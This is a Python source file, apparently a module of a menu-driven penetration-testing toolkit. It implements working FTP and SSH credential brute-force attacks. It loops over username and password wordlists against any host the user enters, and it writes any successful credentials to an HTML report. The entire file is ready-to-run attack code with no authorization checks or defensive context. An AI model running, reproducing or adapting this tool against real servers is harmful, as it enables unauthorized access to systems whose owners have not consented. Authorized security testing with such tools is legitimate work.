import ftplib
import os
import paramiko
from datetime import datetime
from utils.reporter import write_html_section


def clear():
    os.system("cls" if os.name == "nt" else "clear")

def run_ftp_bruteforce():
    clear()
    print("\n🔐 [FTP Brute-Force]")

    target = input("Enter FTP IP or domain: ").strip()
    port = input("Enter port (default 21): ").strip()
    port = int(port) if port else 21

    userlist_path = input("Path to username wordlist (e.g. wordlists/users.txt): ").strip()
    passlist_path = input("Path to password wordlist (e.g. wordlists/passwords.txt): ").strip()

    if not os.path.exists(userlist_path) or not os.path.exists(passlist_path):
        print("[❌] Wordlist file(s) not found.")
        input("Press Enter to return...")
        return

    try:
        with open(userlist_path, 'r') as ufile:
            usernames = [u.strip() for u in ufile if u.strip()]
        with open(passlist_path, 'r') as pfile:
            passwords = [p.strip() for p in pfile if p.strip()]
    except Exception as e:
        print(f"[❌] Error reading files: {e}")
        input("Press Enter to return...")
        return

    print(f"\n[🔍] Starting brute-force on {target}:{port}...\n")

    for username in usernames:
        for password in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(target, port, timeout=3)
                ftp.login(username, password)
                print(f"[✅] SUCCESS: {username}:{password}")
                ftp.quit()                
                lines = [
                    f"Target: {target}:{port}",
                    f"Service: FTP",
                    f"Credentials: {username}:{password}"
                ]
                write_html_section("Brute-Force Results", lines)
                print("[💾] Appended to report.html")
                input("Press Enter to return...")
                return
            except ftplib.error_perm:
                print(f"[❌] Failed: {username}:{password}")
            except Exception as e:
                print(f"[⚠️ ] Error: {e}")
                break

    print("\n[❌] No valid credentials found.")
    input("Press Enter to return...")

def run_ssh_bruteforce():
    clear()
    print("\n🔐 [SSH Brute-Force]")

    target = input("Enter SSH IP or domain: ").strip()
    port = input("Enter port (default 22): ").strip()
    port = int(port) if port else 22

    userlist_path = input("Path to username wordlist: ").strip()
    passlist_path = input("Path to password wordlist: ").strip()

    if not os.path.exists(userlist_path) or not os.path.exists(passlist_path):
        print("[❌] Wordlist file(s) not found.")
        input("Press Enter to return...")
        return

    with open(userlist_path, 'r') as ufile:
        usernames = [u.strip() for u in ufile if u.strip()]
    with open(passlist_path, 'r', errors='ignore') as pfile:
        passwords = [p.strip() for p in pfile if p.strip()]

    print(f"\n[🔍] Starting brute-force on {target}:{port}...\n")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for username in usernames:
        for password in passwords:
            try:
                client.connect(target, port=port, username=username, password=password, timeout=3, allow_agent=False, look_for_keys=False)
                print(f"[✅] SUCCESS: {username}:{password}")
                client.close()             
                lines = [
                    f"Target: {target}:{port}",
                    f"Service: SSH",
                    f"Credentials: {username}:{password}"
                ]
                write_html_section("Brute-Force Results", lines)
                print("[💾] Appended to report.html")
                input("Press Enter to return...")
                return
            except paramiko.AuthenticationException:
                print(f"[❌] Failed: {username}:{password}")
            except paramiko.SSHException:
                print("[⚠️ ] SSH error or rate-limiting detected.")
                break
            except Exception as e:
                print(f"[❌] Error connecting: {e}")
                break

    print("\n[❌] No valid credentials found.")
    input("Press Enter to return...")


def run():
    print("🔐 Brute-Force Toolkit") 
    print("[1] FTP Brute-Force")
    print("[2] SSH Brute-Force")
    print("[3] Back")
    choice = input("Select an option: ").strip()

    if choice == '1':
        run_ftp_bruteforce()
    elif choice == '2':
        run_ssh_bruteforce()
    elif choice == '3':
        return